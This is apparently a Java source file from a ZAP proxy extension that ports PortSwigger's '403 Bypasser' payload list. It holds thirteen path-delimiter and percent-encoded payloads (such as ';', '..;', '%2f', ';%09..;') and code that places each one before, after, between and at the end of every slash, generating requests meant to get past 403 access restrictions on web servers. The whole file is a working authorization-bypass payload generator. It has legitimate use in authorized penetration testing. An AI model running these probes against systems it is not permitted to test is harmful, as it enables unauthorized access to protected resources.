package org.zaproxy.zap.extension.hacktor.technique;

import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import org.zaproxy.zap.extension.hacktor.VulnCatalog;

/**
 * The 403 Bypasser's "Query Payloads" list applied at every slash boundary in the
 * path — ported from PortSwigger's <em>403 Bypasser</em> Burp extension
 * ({@code query payloads.txt} plus {@code generatePayloads()}).
 *
 * <p>Upstream takes thirteen payloads
 * ({@code %09 %20 %23 %2e %2f . ; ..; ;%09 ;%09.. ;%09..; ;%2f.. *}) and, for each one
 * and each {@code /} in the path, builds:
 *
 * <ul>
 *   <li><b>before</b> — {@code path[:i] + payload + path[i:]}: {@code ;/admin};</li>
 *   <li><b>after</b> — {@code path[:i] + "/" + payload + path[i+1:]}: {@code /;/admin};</li>
 *   <li><b>between</b> — {@code path[:i] + "/" + payload + "/" + path[i+1:]}:
 *       {@code /;/admin};</li>
 *   <li><b>end</b> — {@code path + "/" + payload} and {@code path + "/" + payload + "/"}.</li>
 * </ul>
 *
 * <p>These are path parameters, matrix parameters and encoded-delimiter payloads: the
 * classic Tomcat {@code ;jsessionid} style segment parameter, {@code ..;} for servers
 * that pop a path segment only when it is followed by a semicolon, {@code %2f} for
 * front ends that decode before splitting the path and origins that do not, and
 * {@code %09} / {@code %20} for path-splitting on whitespace or tab.
 *
 * <p>Every probe is raw-wire: the percent-encodings must survive to the server
 * un-decoded and then be decoded once by the origin, and the "before" position on the
 * leading slash produces a request-target that is not origin-form at all.
 */
public class SlashPayloadTechniqueBuilder extends AbstractTechniqueBuilder {

    @Override public String getFamily() { return "Slash Payload"; }
    @Override public int getOrder() { return 66; }

    @Override public Technique.Position getPosition() { return Technique.Position.URL; }


    private static final String FAMILY = "Slash Payload";

    /** {@code query payloads.txt} from the 403 Bypasser, in file order. */
    private static final String[] PAYLOADS = {
        "%09", "%20", "%23", "%2e", "%2f", ".", ";", "..;",
        ";%09", ";%09..", ";%09..;", ";%2f..", "*"
    };

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      PathContext ctx) {
        String path = ctx.baseClean;
        if (path == null || path.isEmpty()) path = "/";
        final String p = path;
        final String query = ctx.origQuery == null ? "" : ctx.origQuery;

        for (String payload : PAYLOADS) {
            Set<String> targets = new LinkedHashSet<>();

            for (int i = 0; i < p.length(); i++) {
                if (p.charAt(i) != '/') continue;
                targets.add(p.substring(0, i) + payload + p.substring(i));            // before
                targets.add(p.substring(0, i) + "/" + payload + p.substring(i + 1));  // after
                targets.add(p.substring(0, i) + "/" + payload + "/" + p.substring(i + 1)); // between
            }
            targets.add(p + "/" + payload);
            targets.add(p + "/" + payload + "/");

            for (String variant : targets) {
                if (variant.isEmpty()) continue;
                final String t = variant + query;
                final String pos = position(p, variant, payload);
                Technique tech = new Technique(FAMILY, "SlashPay:" + pos + ":" + label(payload),
                    "403 Bypasser payload '" + describe(payload) + "' " + pos + " the slash"
                        + " -> '" + describe(variant) + "'",
                    base -> { HttpMessage c = cloneMsg(base); setTarget(c, t); return c; });
                tech.setTier(tier(payload));
                markRawAdd(techs, tech);
            }
        }
    }

    /**
     * Names the placement for the label by recomputing which of the four forms
     * produced this target, so identical strings from different positions are not
     * mislabelled.
     */
    private static String position(String path, String variant, String payload) {
        if (variant.equals(path + "/" + payload)) return "end";
        if (variant.equals(path + "/" + payload + "/")) return "end/";
        for (int i = 0; i < path.length(); i++) {
            if (path.charAt(i) != '/') continue;
            if (variant.equals(path.substring(0, i) + payload + path.substring(i))) {
                return "pre" + i;
            }
            if (variant.equals(path.substring(0, i) + "/" + payload + path.substring(i + 1))) {
                return "post" + i;
            }
            if (variant.equals(path.substring(0, i) + "/" + payload + "/"
                    + path.substring(i + 1))) {
                return "mid" + i;
            }
        }
        return "x";
    }

    private static VulnCatalog.Tier tier(String payload) {
        // The bare delimiters and the encoded single delimiters are textbook
        // path-parameter / encoding bypasses; the multi-character ;%09..; family is
        // the less-travelled one.
        switch (payload) {
            case "%09": case "%20": case "%23": case "%2e": case "%2f":
            case ".": case ";": case "*":
                return VulnCatalog.Tier.CLASSIC;
            default:
                return VulnCatalog.Tier.RARE;
        }
    }

    /** Payload rendered so the label stays on one readable line. */
    private static String label(String payload) {
        return payload.replace("%", "P").replace(";", "SC").replace("*", "AST");
    }

    /** Printable form used in the description. */
    private static String describe(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c < 0x20 || c == 0x7F) sb.append(String.format("\\x%02X", (int) c));
            else sb.append(c);
        }
        return sb.toString();
    }
}
